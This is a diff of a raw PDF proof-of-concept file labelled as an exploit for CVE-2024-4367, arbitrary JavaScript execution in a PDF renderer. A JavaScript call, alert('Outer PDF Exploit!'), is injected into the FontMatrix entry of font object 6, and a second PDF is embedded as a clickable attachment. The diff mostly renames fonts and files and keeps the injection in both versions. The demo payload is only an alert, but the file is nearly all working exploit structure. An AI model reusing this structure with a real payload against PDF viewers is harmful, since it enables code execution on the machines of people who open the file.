@@ -1,19 +1,19 @@
 %PDF-1.4
-1 0 obj << /Type /Catalog /Pages 2 0 R /Resources 5 0 R /Names << /EmbeddedFiles << /Names [(EmbeddedPDF.pdf) 10 0 R] >> >> >> endobj
+1 0 obj << /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles << /Names [(InnerPDF.pdf) 10 0 R] >> >> >> endobj
 2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
 3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [11 0 R] >> endobj
 4 0 obj << /Length 68 >> stream
 BT /F1 12 Tf 100 700 Td (CVE-2024-4367 PoC) Tj 100 650 Td (Arbitrary JS Execution) Tj ET
 endstream endobj
 5 0 obj << /Font << /F1 6 0 R >> >> endobj
-6 0 obj << /Type /Font /Subtype /Type1 /BaseFont /FooBarFont /FontDescriptor 7 0 R /FontMatrix [1 2 3 4 5 6]; alert('Outer PDF Exploit!'); /Encoding /StandardEncoding /FirstChar 32 /LastChar 32 /Widths [500] >> endobj
-7 0 obj << /Type /FontDescriptor /FontName /FooBarFont /Flags 32 /FontBBox [-100 -100 600 800] /ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 /FontFile 8 0 R >> endobj
+6 0 obj << /Type /Font /Subtype /Type1 /BaseFont /OuterFont /FontDescriptor 7 0 R /FontMatrix [1 2 3 4 5 6]; alert('Outer PDF Exploit!'); /Encoding /StandardEncoding /FirstChar 32 /LastChar 32 /Widths [500] >> endobj
+7 0 obj << /Type /FontDescriptor /FontName /OuterFont /Flags 32 /FontBBox [-100 -100 600 800] /ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 /FontFile 8 0 R >> endobj
 8 0 obj << /Length 167 >> stream
-%!PS-AdobeFont-1.0: FooBarFont 001.000
-%%Title: FooBarFont
+%!PS-AdobeFont-1.0: OuterFont 001.000
+%%Title: OuterFont
 %%Creator: Grok
 /FontInfo 5 dict dup begin
-  /FullName (FooBarFont) def
+  /FullName (OuterFont) def
 end def
 /FontType 1 def
 /FontMatrix [0.001 0 0 0.001 0 0] def
@@ -60,8 +60,8 @@ startxref
 668
 %%EOF
 endstream endobj
-10 0 obj << /Type /Filespec /F (EmbeddedPDF.pdf) /EF << /F 9 0 R >> >> endobj
-11 0 obj << /Type /Annot /Subtype /FileAttachment /Rect [50 50 70 70] /FS 10 0 R /T (Embedded PDF) /Contents (Click to open embedded PDF) >> endobj
+10 0 obj << /Type /Filespec /F (InnerPDF.pdf) /EF << /F 9 0 R >> >> endobj
+11 0 obj << /Type /Annot /Subtype /FileAttachment /Rect [50 50 70 70] /FS 10 0 R /T (Inner PDF) /Contents (Click to open Inner PDF) >> endobj
 xref
 0 12
 0000000000 65535 f 
